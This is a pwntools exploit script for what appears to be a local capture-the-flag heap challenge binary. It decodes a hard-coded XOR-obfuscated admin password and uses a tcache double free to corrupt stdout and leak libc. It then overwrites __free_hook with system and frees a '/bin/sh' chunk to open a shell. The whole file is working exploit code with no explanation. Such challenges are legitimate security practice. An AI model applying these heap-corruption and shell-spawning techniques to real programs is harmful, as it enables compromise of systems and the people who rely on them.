from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'>'

def add(size, des, name=b'XiaozaYa'):
	sla(menu, b'1')
	sda(b'name:', name)
	sla(b'size:', byte(size))
	sda(b'description:', des)

def dele(idx):
	sla(menu, b'2')
	sla(b'index:', byte(idx))	

name = 'admin'
enc_passwd = '~vzi}'
passwd = ''
for i in enc_passwd:
	tmp = ord(i)
	if (tmp != 59) and (tmp != 100):
		tmp ^= 0x1B	
	passwd += chr(tmp)
passwd = passwd[::-1]
print(name)
print(passwd)

sla(b'username:', name)
sla(b'password:', passwd)

stdout = 0x602020
add(0x68, b'0') # 0
dele(0)
dele(0)
dele(0)
dele(0)
add(0x68, p64(stdout)) # 1
add(0x68, b'2') # 2
add(0x68, b'\x20') # 3
payload = p64(0xfbad1800) + p64(0)*3 + b'\x00'
add(0x68, payload) # 4
rc(24)
libc.address = addr(6) - 0x3d73e0
print("\033[32m[libc_base => "+str(hex(libc.address))+"]\033[0m")

system = libc.sym.system
binsh = next(libc.search(b'/bin/sh'))
free_hook = libc.sym.__free_hook
print("\033[32m[system => "+str(hex(system))+"]\033[0m")
print("\033[32m[binsh_addr => "+str(hex(binsh))+"]\033[0m")
print("\033[32m[free_hook => "+str(hex(free_hook))+"]\033[0m")

dele(0)
dele(0)
dele(0)
add(0x68, p64(free_hook)) # 5
add(0x68, b'/bin/sh\x00') # 6
add(0x68, p64(system)) # 7
dele(6)
#debug()
sh()
